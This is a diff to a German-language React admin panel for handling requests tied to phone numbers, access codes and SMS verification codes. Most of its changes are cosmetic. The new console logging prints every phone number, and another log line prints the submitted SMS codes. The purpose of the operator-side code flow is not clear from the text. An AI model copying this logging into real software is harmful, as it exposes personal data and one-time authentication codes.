@@ -18,33 +18,42 @@ const AdminPanel = () => {
   const [selectedRequest, setSelectedRequest] = useState<string | null>(null);
   
   const handleActivate = (requestId: string) => {
-    console.log('Activating request:', requestId);
+    console.log('🎯 Admin activating request:', requestId);
     activateRequest(requestId);
   };
   
   const handleSendSMS = (requestId: string) => {
-    console.log('Preparing to send SMS for request:', requestId);
+    console.log('📝 Admin preparing to send SMS for request:', requestId);
     setSelectedRequest(requestId);
   };
 
   const handleRequestSMS = (requestId: string) => {
-    console.log('User requested SMS for request:', requestId);
+    console.log('📤 Admin requesting SMS for request:', requestId);
     requestSMS(requestId);
   };
   
   const submitSMS = () => {
     if (selectedRequest && smsCode) {
-      console.log('Submitting SMS code for request:', selectedRequest, 'Code:', smsCode);
+      console.log('📨 Admin submitting SMS code for request:', selectedRequest, 'Code:', smsCode);
       submitSMSCode(selectedRequest, smsCode);
       setSmsCode('');
       setSelectedRequest(null);
     }
   };
+
+  const handleCancelSMS = () => {
+    setSmsCode('');
+    setSelectedRequest(null);
+  };
   
   const requestsList = Object.values(requests);
   
+  // Enhanced logging for admin panel updates
   useEffect(() => {
-    console.log('Admin Panel requests:', requestsList);
+    console.log('🔄 Admin Panel requests updated:', requestsList);
+    requestsList.forEach(request => {
+      console.log(`📊 Request ${request.id}: ${request.status} - Phone: ${request.phone}`);
+    });
   }, [requests]);
   
   if (authLoading) {
@@ -119,7 +128,7 @@ const AdminPanel = () => {
           </thead>
           <tbody className="bg-white divide-y divide-gray-200">
             {requestsList.map((request) => (
-              <tr key={request.id} className="hover:bg-gray-50">
+              <tr key={request.id} className="hover:bg-gray-50 transition-colors">
                 <td className="px-6 py-4 whitespace-nowrap">
                   <div className="text-sm font-medium text-gray-900">{request.phone}</div>
                 </td>
@@ -127,16 +136,16 @@ const AdminPanel = () => {
                   <div className="text-sm text-gray-500">{request.accessCode}</div>
                 </td>
                 <td className="px-6 py-4 whitespace-nowrap">
-                  <span className={`px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${
+                  <span className={`px-2 inline-flex text-xs leading-5 font-semibold rounded-full transition-all ${
                     request.status === 'pending' ? 'bg-yellow-100 text-yellow-800' :
                     request.status === 'activated' ? 'bg-blue-100 text-blue-800' :
-                    request.status === 'sms_requested' ? 'bg-orange-100 text-orange-800' :
+                    request.status === 'sms_requested' ? 'bg-orange-100 text-orange-800 animate-pulse' :
                     'bg-green-100 text-green-800'
                   }`}>
-                    {request.status === 'pending' ? 'In Bearbeitung' :
-                     request.status === 'activated' ? 'Aktiviert' :
-                     request.status === 'sms_requested' ? 'SMS Code benötigt' :
-                     'Abgeschlossen'}
+                    {request.status === 'pending' ? '⏳ In Bearbeitung' :
+                     request.status === 'activated' ? '✅ Aktiviert' :
+                     request.status === 'sms_requested' ? '📤 SMS Code benötigt' :
+                     '✅ Abgeschlossen'}
                   </span>
                 </td>
                 <td className="px-6 py-4 whitespace-nowrap text-sm font-medium">
@@ -144,7 +153,7 @@ const AdminPanel = () => {
                     <Button 
                       onClick={() => handleActivate(request.id)}
                       size="sm"
-                      className="bg-orange hover:bg-orange-dark"
+                      className="bg-orange hover:bg-orange-dark transition-all"
                     >
                       Aktivieren
                     </Button>
@@ -155,7 +164,7 @@ const AdminPanel = () => {
                       <Button
                         onClick={() => handleRequestSMS(request.id)}
                         size="sm"
-                        className="bg-blue-500 hover:bg-blue-600"
+                        className="bg-blue-500 hover:bg-blue-600 transition-all"
                       >
                         <Send className="h-4 w-4 mr-1" /> SMS Anfordern
                       </Button>
@@ -166,15 +175,15 @@ const AdminPanel = () => {
                     <Button 
                       onClick={() => handleSendSMS(request.id)}
                       size="sm" 
-                      className="bg-orange hover:bg-orange-dark"
+                      className="bg-orange hover:bg-orange-dark animate-pulse transition-all"
                     >
-                      SMS Code eingeben
+                      📨 SMS Code eingeben
                     </Button>
                   )}
                   
                   {request.status === 'completed' && (
                     <div className="text-sm text-gray-500">
-                      SMS Code: <span className="font-medium">{request.smsCode}</span>
+                      SMS Code: <span className="font-medium bg-green-100 px-2 py-1 rounded">{request.smsCode}</span>
                     </div>
                   )}
                 </td>
@@ -208,19 +217,33 @@ const AdminPanel = () => {
           <h2 className="text-2xl font-bold mb-6">Admin Panel - Anfragen</h2>
           
           {selectedRequest && (
-            <div className="mb-6 p-4 border border-orange rounded-lg bg-orange-50">
-              <h3 className="text-lg font-medium mb-2">SMS Code senden</h3>
-              <p className="mb-2">Anfrage ID: {selectedRequest}</p>
-              <div className="flex space-x-2">
+            <div className="mb-6 p-6 border-2 border-orange rounded-lg bg-gradient-to-r from-orange-50 to-yellow-50 shadow-lg">
+              <h3 className="text-lg font-medium mb-3 text-orange-800">📨 SMS Code senden</h3>
+              <p className="mb-3 text-gray-700">
+                <strong>Anfrage ID:</strong> <code className="bg-gray-200 px-2 py-1 rounded">{selectedRequest}</code>
+              </p>
+              <div className="flex space-x-3">
                 <Input
                   type="text"
                   value={smsCode}
                   onChange={(e) => setSmsCode(e.target.value)}
                   placeholder="SMS Code eingeben"
+                  className="flex-1"
                   autoFocus
                 />
-                <Button onClick={submitSMS} className="bg-orange hover:bg-orange-dark">
-                  Senden
+                <Button 
+                  onClick={submitSMS} 
+                  className="bg-orange hover:bg-orange-dark transition-all"
+                  disabled={!smsCode.trim()}
+                >
+                  ✅ Senden
+                </Button>
+                <Button 
+                  onClick={handleCancelSMS}
+                  variant="outline" 
+                  className="border-gray-300 hover:bg-gray-50 transition-all"
+                >
+                  ❌ Abbrechen
                 </Button>
               </div>
             </div>
